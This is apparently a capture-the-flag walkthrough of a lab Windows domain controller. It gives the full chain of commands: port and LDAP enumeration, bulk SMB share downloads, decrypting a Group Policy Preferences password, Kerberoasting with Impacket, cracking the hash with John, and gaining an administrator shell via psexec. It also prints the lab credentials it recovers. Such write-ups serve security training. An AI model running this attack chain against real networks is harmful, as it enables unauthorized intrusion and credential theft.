# Initial Recon
## Port Scans

### All Ports

```shell
nmap -p- -T4 --min-rate 10000 -oA nmap/all 10.129.230.20
```

![](Pasted%20image%2020240529200240.png)

### Port Versions Scan

```shell
nmap -sCV -O -T4 --min-rate 10000 -oA nmap/versions -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49173,49174 10.129.230.20
```

![](Pasted%20image%2020240529200440.png)
## Anonymous LDAP Enumeration

### Base Active Directory Data

```shell
ldapsearch -H ldap://10.129.230.20 -x -s base namingcontexts
```

![](Pasted%20image%2020240529162820.png)

### All Active User Enumeration

Attempting to perform an anonymous `ldapsearch` for active users in the directory results in bind error likely due to insufficient rights.

```shell
ldapsearch -x -H 'ldap://10.129.230.20' -b "DC=active,DC=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))"
```

![](Pasted%20image%2020240529165917.png)

## Anonymous SMB Enumeration - Port 445

```shell
smbclient -N -L  \\\\10.129.230.20
```

![](Pasted%20image%2020240529132539.png)

### SMB Data Exfiltration

```shell
smbclient -N \\\\10.129.230.20\\Replication
```

#### SMB Commands

```shell
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

![](Pasted%20image%2020240529133954.png)

### SMB Write Enumeration

We then check if we have write access to the SMB share.

```shell
echo test > test.txt
```

#### SMB commands

```
smb: \> put test.txt
```

We get access denied attempting to write our test file to the share.

![](Pasted%20image%2020240529134308.png)

# Initial Foothold

## Password Disclosure

Recursively searching the downloaded files for the term "pass" reveals a `GPP` credential in a `Groups.xml` file.

```shell
grep -arin pass
```

![](Pasted%20image%2020240529134850.png)

## Password Attack

Using the `gpp-decrypt` tool on Kali, we can decrypt the `cpassword` encrypted string to plain text. 

```shell
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'

GPPstillStandingStrong2k18
```

We crack the password and from the previous password disclosure, we can also see that there is a `userName` of `active.htb\SVC_TGS`. Test the credentials using `crackmapexec`:

```shell
crackmapexec smb 10.129.230.20 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![](Pasted%20image%2020240529140318.png)

# Authenticated Enumeration

## Lateral Movement

![](Pasted%20image%2020240529140425.png)

## Authenticated SMB Data Exfiltration

```shell
smbclient \\\\10.129.230.20\\Users -U SVC_TGS
```

Enter the exposed credentials as the password when prompted.

### SMB Client Commands

```shell
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

![](Pasted%20image%2020240529140609.png)

### User Flag

From the SMB `mget *` output, we can see that there is a `user.txt` flag at `\SVC_TGS\Desktop\user.txt` on the SMB share. We can simply print out the contents of the file on our target machine:

```shell
cat SVC_TGS/Desktop/user.txt
```

![](Pasted%20image%2020240529204743.png)
## Authenticated LDAP Enumeration

```shell
ldapsearch -x -H 'ldap://10.129.230.20' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "DC=active,DC=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
```

![](Pasted%20image%2020240529170618.png)

We can add to the LDAP filter by looking for only accounts with a `servicePrincipalName`:

```shell
ldapsearch -x -H 'ldap://10.129.230.20' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "DC=active,DC=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
```

![](Pasted%20image%2020240529171125.png)

This confirms that it is possible that the machine is vulnerable to a Kerberoast attack.

# Privilege Escalation

First we request `SPNs` using Impackets `GetUserSPNs.py` script:

```shell
impacket-GetUserSPNs -target-domain active.htb -request -dc-host active.htb active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile spn.hashes
```

![](Pasted%20image%2020240529171229.png)

## Password Crack

```shell
john spn.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

![](Pasted%20image%2020240529171425.png)

```
Ticketmaster1968
```

We can now connect to the machine using the `Administrator` credentials using Impacket's `Psexec.py`:

```shell
impacket-psexec 'active.htb'/'Administrator':'Ticketmaster1968'@'active.htb'
```

![](Pasted%20image%2020240529150701.png)
